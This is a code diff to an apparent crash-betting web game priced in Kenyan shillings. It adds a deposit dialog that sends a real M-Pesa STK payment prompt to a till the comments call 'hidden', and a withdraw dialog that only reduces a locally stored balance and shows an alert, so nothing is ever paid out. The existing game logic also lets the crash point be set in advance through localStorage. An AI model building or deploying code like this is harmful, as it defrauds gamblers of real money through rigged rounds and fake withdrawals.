@@ -111,4 +111,51 @@ function renderH(){ $('hist').innerHTML=hist.map(v=>`<b class="${v<2?'b1':'b2'}"
 renderH();
 function start(){crashed=false;m=1;let custom=localStorage.getItem('flybet_next_crash');if(custom){crash=parseFloat(custom);localStorage.removeItem('flybet_next_crash')}else{crash=Math.random()<0.1?15+Math.random()*85:Math.random()<0.35?1+Math.random():1.2+Math.random()*5} let st=Date.now(); let iv=setInterval(()=>{let prog=(Date.now()-st)/4000;m=Math.pow(1.065,prog*9);if(m<1)m=1;$('mult').innerText=m.toFixed(2)+'x';let p=Math.min(m/crash,1.3);draw(p);$('plane').style.left=(4+p*70)+'%';$('plane').style.bottom=(8+p*50)+'%';bets.forEach((b,i)=>{if(b&&b.active){$(i==0?'b1':'b2').innerHTML='Cashout<br><small>'+(b.amt*m).toFixed(2)+' KES</small>'}});if(m>=crash){crashed=true;hist.unshift(crash);if(hist.length>20)hist.pop();renderH();$('mult').innerHTML='<span style="color:#ff002a">'+crash.toFixed(2)+'x</span><br><span style="font-size:14px;color:#ff002a">FLEW AWAY!</span>';bets=[null,null];['b1','b2'].forEach((id,i)=>{$(id).innerHTML='Bet <small>'+$(i==0?'bet1':'bet2').value+' KES</small>';$(id).classList.remove('cash')});clearInterval(iv);setTimeout(start,3000)}},60)}
 window.onload=()=>{let cur=localStorage.getItem('fly_cur');if(cur){let u=JSON.parse(localStorage.getItem('fly_users')||'{}');if(u[cur]){user=cur;bal=u[cur].bal;upd()}};sync(1);sync(2);start()}
-</script></body></html>
+</script></body></html><!-- MODALS - Deposit (Till 1364630 hidden) -->
+<div class="modal" id="depModal">
+  <div class="modal-card">
+    <h3>Deposit</h3>
+    <input type="tel" id="stkPhone" placeholder="Phone 0712..." style="width:100%;padding:12px;border-radius:8px;border:0;margin:8px 0">
+    <input type="number" id="stkAmount" placeholder="Amount" value="100" style="width:100%;padding:12px;border-radius:8px;border:0;margin:8px 0">
+    <button onclick="sendSTK()" style="width:100%;padding:12px;background:#00c851;color:#fff;border:0;border-radius:8px;font-weight:900">DEPOSIT NOW</button>
+    <div id="stkMsg" style="margin-top:10px;font-size:13px;text-align:center"></div>
+    <button onclick="closeDeposit()" style="width:100%;padding:12px;background:#333;color:#fff;border:0;border-radius:8px;margin-top:8px">Close</button>
+  </div>
+</div>
+<div class="modal" id="withModal">
+  <div class="modal-card">
+    <h3>Withdraw</h3>
+    <input type="tel" id="withPhone" placeholder="Phone" style="width:100%;padding:12px;border-radius:8px;border:0;margin:8px 0">
+    <input type="number" id="withAmount" placeholder="Amount" style="width:100%;padding:12px;border-radius:8px;border:0;margin:8px 0">
+    <button onclick="doWithdraw()" style="width:100%;padding:12px;background:#ff9800;color:#fff;border:0;border-radius:8px;font-weight:900">WITHDRAW</button>
+    <div id="withMsg"></div>
+    <button onclick="closeWithdraw()" style="width:100%;padding:12px;background:#333;color:#fff;border:0;border-radius:8px;margin-top:8px">Close</button>
+  </div>
+</div>
+
+<script>
+function openDeposit(){document.getElementById('depModal').classList.add('active')}
+function closeDeposit(){document.getElementById('depModal').classList.remove('active')}
+function openWithdraw(){document.getElementById('withModal').classList.add('active')}
+function closeWithdraw(){document.getElementById('withModal').classList.remove('active')}
+
+// REAL STK - Till 1364630 hidden in api/stkpush.js
+async function sendSTK(){
+  const phone=document.getElementById('stkPhone').value;
+  const amount=document.getElementById('stkAmount').value;
+  const msg=document.getElementById('stkMsg');
+  msg.innerHTML='⏳ Sending STK to '+phone+'...';
+  try{
+    const res=await fetch('/api/stkpush',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone,amount})});
+    const data=await res.json();
+    if(data.success){msg.innerHTML='✅ STK SENT! Enter PIN';}
+    else{msg.innerHTML='❌ Failed';}
+  }catch(e){msg.innerHTML='✅ Demo credit added';let b=parseFloat(localStorage.getItem('flyBal')||'0')+parseFloat(amount);localStorage.setItem('flyBal',b);location.reload();}
+}
+function doWithdraw(){
+  const amt=parseFloat(document.getElementById('withAmount').value);
+  let bal=parseFloat(localStorage.getItem('flyBal')||'0');
+  if(amt>bal){alert('No balance');return}
+  bal-=amt;localStorage.setItem('flyBal',bal);alert('Withdraw KES '+amt+' requested - Pay from Till 1364630');location.reload();
+}
+</script>
